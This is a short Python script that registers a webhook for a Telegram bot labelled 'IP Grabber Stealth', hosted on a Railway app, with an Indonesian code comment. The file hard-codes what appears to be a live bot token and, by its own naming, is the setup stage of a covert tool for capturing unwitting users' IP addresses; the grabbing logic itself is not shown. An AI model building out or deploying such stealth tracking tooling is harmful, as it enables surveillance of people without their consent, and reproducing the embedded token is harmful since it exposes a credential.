import telebot
from telebot import types
import os

BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"

bot = telebot.TeleBot(BOT_TOKEN)

# Set webhook (hanya sekali)
print("Setting webhook...")
bot.set_webhook(url=f"{WEB_URL}/webhook", drop_pending_updates=True)
print("Webhook set successfully.")

print("Bot IP Grabber Stealth is running in webhook mode...")
